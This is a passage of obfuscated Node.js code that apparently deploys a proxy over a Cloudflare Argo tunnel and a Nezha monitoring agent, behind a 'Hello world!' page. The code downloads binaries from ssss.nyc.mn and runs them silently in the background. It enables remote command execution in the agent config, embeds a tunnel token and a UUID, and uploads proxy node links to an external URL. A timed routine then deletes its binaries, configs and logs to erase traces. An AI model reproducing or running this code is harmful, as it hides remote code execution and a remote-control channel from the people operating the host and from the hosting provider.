rotocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','response','/dev/null','--tls','vless','\x20failed:\x20','Subscription\x20uploaded\x20successfully','block','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/trojan-argo','Error\x20downloading\x20files:','https://amd64.ssss.nyc.mn/bot','127.0.0.1','firefox','unlink','php\x20running\x20error:\x20','PORT','railway','TunnelSecret','PROJECT_URL','/api/delete-nodes','clear','.exe\x20>\x20nul\x202>&1','ARGO_DOMAIN:','&path=%2Ftrojan-argo%3Fed%3D2560#','push','from','&fp=firefox&type=ws&host=','2053','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','arm64','https://amd64.ssss.nyc.mn/web','split','quic','https://amd64.ssss.nyc.mn/agent','Error\x20executing\x20command:\x20','fileName','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','exec','\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/bot','\x22\x20>\x20/dev/null\x202>&1','config.json','error','close','floor','2911800FJFgDB','boot.log','amd','http','freedom','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','del\x20/f\x20/q\x20','nohup\x20','6qxaXad','UUID','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/api/add-nodes','tcp','get','true','\x0a\x0atrojan://','Empowerment\x20success\x20for\x20','rm\x20-rf\x20','createWriteStream','map','forEach','3843930owFEqD','message','8443','2842504dlqYee','env','ArgoDomain:','axios','web\x20running\x20error:\x20','Skipping\x20adding\x20automatic\x20access\x20task','\x0avless://','NEZHA_SERVER','fileUrl','list.txt','Empowerment\x20failed\x20for\x20','2096','eyJhIjoiYjBlMDhjMzA0Y2ZlZGEzNWE2NWM1ZDA2YTkyYWU4NmEiLCJ0IjoiYzkzMzAzMTQtN2IyYi00ZTM3LWI1ODEtYzUyNGQ5NjE3YmY2IiwicyI6Ik1tUTNNakkxTmpFdFpqUTVOeTAwTURVNUxUazJNRFF0WlRObVltWm1aR00yTURrNSJ9','countryCode','Unknown','country_code','NEZHA\x20variable\x20is\x20empty,skip\x20running','684437UCvUSF','ARGO_PORT','org','Hello\x20world!','sub.txt','452248JdePTg','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm\x20running\x20error:\x20','5249797qGlHaU','\x20-c\x20','toString','34930640xTMxfE','direct','substring','xtls-rprx-vision','ffdafbb1-1dd8-4fb6-a535-06f3624d720d','all','Add\x20automatic\x20access\x20task\x20faild:\x20','http\x20server\x20is\x20running\x20on\x20port:','stringify','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','charAt','10aZpztR','https+local://8.8.8.8/dns-query','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','9ftHWtB','existsSync','unlinkSync','join','false','writeFileSync','/vless-argo','arch','vmess','Download\x20','mkdirSync','/vmess-argo','ARGO_DOMAIN','statSync','https://arm64.ssss.nyc.mn/agent','express','2083','then','log','catch','\x20already\x20exists','https://amd64.ssss.nyc.mn/v1','length','finish','status','automatic\x20access\x20task\x20added\x20successfully','\x20-p\x20','tls','/api/add-subscriptions','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','base64'];_0x55cc=function(){return _0x569466;};return _0x55cc();}async function uploadNodes(){const _0x2b5c33={_0x997b68:0x20c,_0x31d294:0x208,_0x224b9f:0x186,_0x45c690:0x211,_0x36e1be:0x1a0,_0x4748d9:0x171,_0x1e829f:0x1b9,_0x2ec078:0x21f},_0x48f359=_0x18ac58;if(UPLOAD_URL&&PROJECT_URL){const _0x42a3dd=PROJECT_URL+'/'+SUB_PATH,_0x326134={'subscription':[_0x42a3dd]};try{const _0x35a829=await axios[_0x48f359(0x171)](UPLOAD_URL+_0x48f359(_0x2b5c33._0x997b68),_0x326134,{'headers':{'Content-Type':_0x48f359(0x22b)}});return _0x35a829&&_0x35a829[_0x48f359(_0x2b5c33._0x31d294)]===0xc8?(console['log'](_0x48f359(_0x2b5c33._0x224b9f)),_0x35a829):null;}catch(_0x28269a){if(_0x28269a['response']){if(_0x28269a[_0x48f359(0x181)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x48f359(0x1f1)](listPath))return;const _0x3f308c=fs['readFileSync'](listPath,_0x48f359(_0x2b5c33._0x45c690)),_0x3dd19b=_0x3f308c[_0x48f359(_0x2b5c33._0x36e1be)]('\x0a')[_0x48f359(0x224)](_0x17b9b8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x48f359(0x222)](_0x17b9b8));if(_0x3dd19b['length']===0x0)return;const _0xf10c0a=JSON['stringify']({'nodes':_0x3dd19b});try{const _0x139ae5=await axios[_0x48f359(_0x2b5c33._0x4748d9)](UPLOAD_URL+_0x48f359(_0x2b5c33._0x1e829f),_0xf10c0a,{'headers':{'Content-Type':_0x48f359(0x22b)}});return _0x139ae5&&_0x139ae5[_0x48f359(_0x2b5c33._0x31d294)]===0xc8?(console[_0x48f359(0x202)](_0x48f359(_0x2b5c33._0x2ec078)),_0x139ae5):null;}catch(_0x1b06fc){return null;}}else return;}}function cleanFiles(){const _0x2641ee={_0x2a5f94:0x199,_0x18db5c:0x16b,_0x128a3d:0x1f3,_0xafc0ec:0x1bf},_0x217e8a={_0x17004a:0x202};setTimeout(()=>{const _0x145214=_0x4d80,_0x5d9ce9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5d9ce9[_0x145214(0x199)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5d9ce9[_0x145214(_0x2641ee._0x2a5f94)](phpPath);process[_0x145214(_0x2641ee._0x18db5c)]===_0x145214(0x17f)?exec(_0x145214(0x1b4)+_0x5d9ce9[_0x145214(_0x2641ee._0x128a3d)]('\x20')+_0x145214(0x176),_0x28ce76=>{const _0x3eb6f1=_0x145214;console[_0x3eb6f1(0x195)](),console['log']('App\x20is\x20running'),console[_0x3eb6f1(_0x217e8a._0x17004a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x145214(_0x2641ee._0xafc0ec)+_0x5d9ce9[_0x145214(_0x2641ee._0x128a3d)]('\x20')+'\x20>/dev/null\x202>&1',_0xadb350=>{const _0x5777d4=_0x145214;console[_0x5777d4(0x195)](),console[_0x5777d4(0x202)](_0x5777d4(0x17b)),console[_0x5777d4(0x202)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3c041c={_0x1beca8:0x219,_0x4720ba:0x202,_0xfa3db2:0x1ab,_0x137ed3:0x1e8},_0x257856=_0x18ac58;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x257856(0x202)](_0x257856(0x1cb));return;}try{const _0x4e84e2=await axios[_0x257856(0x171)](_0x257856(_0x3c041c._0x1beca8),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x257856(0x22b)}});return console[_0x257856(_0x3c041c._0x4720ba)](_0x257856(0x209)),_0x4e84e2;}catch(_0x56bf6c){return console[_0x257856(_0x3c041c._0xfa3db2)](_0x257856(_0x3c041c._0x137ed3)+_0x56bf6c[_0x257856(0x1c4)]),null;}}async function startserver(){const _0x15a41e={_0x32c665:0x1ab},_0x3fb908=_0x18ac58;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x45d900){console[_0x3fb908(_0x15a41e._0x32c665)](_0x3fb908(0x16e),_0x45d900);}}startserver()[_0x18ac58(0x203)](_0x41628e=>{const _0x4527b6=_0x18ac58;console[_0x4527b6(0x1ab)]('Unhandled\x20error\x20in\x20startserver:',_0x41628e);}),app['listen'](PORT,()=>console[_0x18ac58(0x202)](_0x18ac58(0x1e9)+PORT+'!'));
